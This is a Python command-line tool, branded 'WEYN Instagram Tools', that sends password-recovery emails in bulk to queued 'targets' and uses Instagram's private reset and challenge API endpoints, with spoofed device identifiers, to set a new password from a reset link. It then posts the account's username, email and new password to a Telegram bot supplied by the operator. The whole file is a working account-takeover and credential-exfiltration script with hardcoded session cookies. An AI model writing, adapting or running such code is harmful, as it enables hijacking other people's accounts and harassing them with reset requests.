import os
import sys
import json
import string
import random
import uuid
import ssl
import httpx
import requests
import pyfiglet
from datetime import datetime
from hashlib import md5

# === HACKER THEME - RED ===
R1  = '\033[1;31m'   # bright red
R2  = '\033[0;31m'   # dim red
R3  = '\033[2;31m'   # dark red
W   = '\033[1;37m'   # white
DIM = '\033[2;37m'   # dim white
YLW = '\033[1;33m'   # yellow (warnings)
RST = '\033[0m'

DIV  = f"{R2}{'█' * 46}{RST}"
DIV2 = f"{R3}{'▓▒░' * 15}▓{RST}"


def clr():
    os.system('clear')


def get_banner():
    ascii_art = pyfiglet.figlet_format('WEYN', font='doom')
    lines = ascii_art.splitlines()
    out = []
    for line in lines:
        out.append(f"{R1}{line}{RST}")
    banner = '\n'.join(out)
    return (
        f"\n{DIV2}\n"
        f"{banner}\n"
        f"{R2}        [ INSTAGRAM TOOLS ]   {DIM}by WEYN{RST}\n"
        f"{DIV2}\n"
    )


def section(title):
    pad = (44 - len(title) - 2) // 2
    bar = '═' * pad
    return f"\n{R1}╔{bar}[ {W}{title}{R1} ]{bar}╗{RST}\n"


def wait_back():
    print(f"\n{R2}  ╚══► {YLW}[B]{RST}{DIM} Back to menu{RST}")
    while True:
        val = input(f"  {R1}>{RST} ").strip().lower()
        if val == 'b':
            break


MENU = f"""
{R2}  ╔══════════════════════════════════════════╗
  ║  {R1}[1]{W}  Reset Link  {DIM}──  Send recovery email   {R2}║
  ║  {R1}[2]{W}  Reset Pass  {DIM}──  Reset via reset link  {R2}║
  ╚══════════════════════════════════════════╝{RST}
"""

ig_cookies = {
    "csrftoken": "qXbOywPKhDdMfdTceKhs2DcocVgMz4q8",
    "mid":       "adiAuAAEAAFqNhj2f7KBf56OjV5_",
    "ig_did":    "6C2A174F-093F-4BAC-8DDF-B7D6527F73AE",
}

ig_headers = {
    "accept":           "*/*",
    "accept-language":  "en-US,en;q=1.0",
    "content-type":     "application/x-www-form-urlencoded",
    "user-agent":       "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1",
    "x-ig-app-id":      "936619743392459",
    "x-csrftoken":      "qXbOywPKhDdMfdTceKhs2DcocVgMz4q8",
    "x-requested-with": "XMLHttpRequest",
}

jazoest_list = ["22603", "22913", "22785", "22841", "22567"]


def get_safe_context():
    context = ssl.create_default_context()
    context.set_ciphers('DEFAULT@SECLEVEL=1')
    return context


def send_recovery(email):
    url = "https://www.instagram.com/api/v1/web/accounts/account_recovery_send_ajax/?hl=en"
    data = {"email_or_username": email, "jazoest": random.choice(jazoest_list)}
    try:
        with httpx.Client(http2=True, verify=get_safe_context(), timeout=20) as client:
            r = client.post(url, headers=ig_headers, cookies=ig_cookies, data=data)
            try:
                parsed = json.loads(r.text)
                print(f"  {R1}[+]{RST} {W}{email}{RST}  {DIM}{json.dumps(parsed)}{RST}")
            except:
                print(f"  {R1}[+]{RST} {W}{email}{RST}  {DIM}{r.text}{RST}")
    except Exception as e:
        print(f"  {R2}[!]{RST} {W}{email}{RST}  {YLW}ERROR: {e}{RST}")


def generate_device_info(custom_password=None):
    ANDROID_ID = f"android-{''.join(random.choices(string.hexdigits.lower(), k=16))}"
    USER_AGENT = (
        f"Instagram 394.0.0.46.81 Android ("
        f"{random.choice(['28/9','29/10','30/11','31/12'])}; "
        f"{random.choice(['240dpi','320dpi','480dpi'])}; "
        f"{random.choice(['720x1280','1080x1920','1440x2560'])}; "
        f"{random.choice(['samsung','xiaomi','huawei','oneplus','google'])}; "
        f"{random.choice(['SM-G975F','Mi-9T','P30-Pro','ONEPLUS-A6003','Pixel-4'])}; "
        f"intel; en_US; {random.randint(100000000, 999999999)})"
    )
    WATERFALL_ID = str(uuid.uuid4())
    timestamp = int(datetime.now().timestamp())
    raw_pass = custom_password if custom_password else f'@pass{"".join([str(random.randint(1,100)) for _ in range(4)])}'
    PASSWORD = f'#PWD_INSTAGRAM:0:{timestamp}:{raw_pass}'
    return ANDROID_ID, USER_AGENT, WATERFALL_ID, PASSWORD


def make_headers(mid="", user_agent=""):
    return {
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "X-Bloks-Version-Id": "e061cacfa956f06869fc2b678270bef1583d2480bf51f508321e64cfb5cc12bd",
        "X-Mid": mid,
        "User-Agent": user_agent,
        "Content-Length": "9481"
    }


def id_user(user_id):
    try:
        url = f"https://i.instagram.com/api/v1/users/{user_id}/info/"
        r = requests.get(url, headers={"User-Agent": "Instagram 219.0.0.12.117 Android"})
        return r.json()["user"]["username"]
    except:
        return str(user_id)


def send_telegram(bot_token, chat_id, text):
    url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
    try:
        r = requests.post(url, data={"chat_id": chat_id, "text": text}, timeout=10)
        return r.json()
    except Exception as e:
        print(f"  {YLW}[!] Telegram error: {e}{RST}")
        return None


def reset_instagram_password(reset_link, custom_password=None):
    try:
        ANDROID_ID, USER_AGENT, WATERFALL_ID, PASSWORD = generate_device_info(custom_password)
        uidb36 = reset_link.split("uidb36=")[1].split("&token=")[0]
        token  = reset_link.split("&token=")[1].split(":")[0]

        url  = "https://i.instagram.com/api/v1/accounts/password_reset/"
        data = {
            "source": "one_click_login_email",
            "uidb36": uidb36,
            "device_id": ANDROID_ID,
            "token": token,
            "waterfall_id": WATERFALL_ID
        }
        r = requests.post(url, headers=make_headers(user_agent=USER_AGENT), data=data)

        if "user_id" not in r.text:
            return {"success": False, "error": f"Reset request failed: {r.text}"}

        mid              = r.headers.get("Ig-Set-X-Mid")
        resp_json        = r.json()
        user_id          = resp_json.get("user_id")
        cni              = resp_json.get("cni")
        nonce_code       = resp_json.get("nonce_code")
        challenge_context = resp_json.get("challenge_context")

        url2  = "https://i.instagram.com/api/v1/bloks/apps/com.instagram.challenge.navigation.take_challenge/"
        data2 = {
            "user_id":    str(user_id),
            "cni":        str(cni),
            "nonce_code": str(nonce_code),
            "bk_client_context":   '{"bloks_version":"e061cacfa956f06869fc2b678270bef1583d2480bf51f508321e64cfb5cc12bd","styles_id":"instagram"}',
            "challenge_context":   str(challenge_context),
            "bloks_versioning_id": "e061cacfa956f06869fc2b678270bef1583d2480bf51f508321e64cfb5cc12bd",
            "get_challenge": "true"
        }
        r2 = requests.post(url2, headers=make_headers(mid, USER_AGENT), data=data2).text

        challenge_context_final = (
            r2.replace('\\', '')
            .split(f'(bk.action.i64.Const, {cni}), "')[1]
            .split('", (bk.action.bool.Const, false)))')[0]
        )

        data3 = {
            "is_caa": "False", "source": "", "uidb36": "",
            "error_state": {"type_name": "str", "index": 0, "state_id": 1048583541},
            "afv": "", "cni": str(cni), "token": "", "has_follow_up_screens": "0",
            "bk_client_context": {"bloks_version": "e061cacfa956f06869fc2b678270bef1583d2480bf51f508321e64cfb5cc12bd", "styles_id": "instagram"},
            "challenge_context":   challenge_context_final,
            "bloks_versioning_id": "e061cacfa956f06869fc2b678270bef1583d2480bf51f508321e64cfb5cc12bd",
            "enc_new_password1":   PASSWORD,
            "enc_new_password2":   PASSWORD
        }

        requests.post(url2, headers=make_headers(mid, USER_AGENT), data=data3)
        return {"success": True, "password": PASSWORD.split(":")[-1], "user_id": user_id}

    except Exception as e:
        return {"success": False, "error": str(e)}


def prompt(label):
    return input(f"  {R1}╠══►{RST} {W}{label}{RST}{R1} :{RST} ").strip()


def tool_reset_link():
    emails = []
    while True:
        clr()
        print(section("RESET LINK"))
        print(f"  {DIM}Enter one Gmail per line.{RST}")
        print(f"  {DIM}Leave blank line to start  ·  [B] = back{RST}\n")
        if emails:
            print(f"  {R2}Queued targets:{RST}")
            for e in emails:
                print(f"    {R1}▸{RST} {W}{e}{RST}")
            print()
        line = prompt("Gmail")
        if line.lower() == 'b':
            return
        if line == '':
            break
        emails.append(line)

    if not emails:
        clr()
        print(f"\n  {YLW}[!] No targets entered.{RST}")
        wait_back()
        return

    clr()
    print(section("SENDING RECOVERY"))
    print(f"  {R2}[*]{RST} {DIM}Firing at {R1}{len(emails)}{RST} {DIM}target(s)...{RST}\n")
    for email in emails:
        send_recovery(email)
    print(f"\n{DIV2}")
    wait_back()


def tool_reset_pass():
    clr()
    print(section("RESET PASS"))
    print(f"  {DIM}[B] at any prompt returns to menu{RST}\n")

    clr(); print(section("RESET PASS"))
    chat_id = prompt("Telegram Chat ID")
    if chat_id.lower() == 'b': return

    clr(); print(section("RESET PASS"))
    bot_token = prompt("Telegram Bot Token")
    if bot_token.lower() == 'b': return

    clr(); print(section("RESET PASS"))
    email = prompt("Email")
    if email.lower() == 'b': return

    clr(); print(section("RESET PASS"))
    reset_link = prompt("Reset Link")
    if reset_link.lower() == 'b': return

    clr(); print(section("RESET PASS"))
    custom_password = prompt("New Password  (blank = auto-generate)")
    if custom_password.lower() == 'b': return

    clr()
    print(section("PROCESSING"))
    print(f"  {R1}[*]{RST} {DIM}Executing reset sequence...{RST}\n")

    result = reset_instagram_password(reset_link, custom_password if custom_password else None)

    if result.get("success"):
        user_id      = result.get("user_id")
        new_password = result.get("password")
        username     = id_user(user_id)

        print(f"  {R1}[+]{RST} {W}Success — sending to Telegram...{RST}\n")

        msg = (
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"   WEYN INSTAGRAM RESET PASS\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"USERNAME ➪  {username}\n"
            f"EMAIL    ➪  {email}\n"
            f"PASSWORD ➪  {new_password}\n\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"        BY: @jinbelowg\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
        )
        print(f"{DIM}{msg}{RST}")
        send_telegram(bot_token, chat_id, msg)
        print(f"\n  {R1}[✓]{RST} {W}Done.{RST}")
    else:
        print(f"  {YLW}[!]{RST} {YLW}Failed:{RST} {result.get('error', 'Unknown error')}")

    print(f"\n{DIV2}")
    wait_back()


def main():
    while True:
        clr()
        print(get_banner())
        print(MENU)
        choice = input(f"  {R1}root@weyn{RST}{DIM}~#{RST} ").strip().lower()

        if choice == '1':
            tool_reset_link()
        elif choice == '2':
            tool_reset_pass()
        elif choice == 'b':
            continue
        else:
            clr()
            print(f"\n  {YLW}[!] Invalid option.{RST}")
            wait_back()


if __name__ == "__main__":
    main()
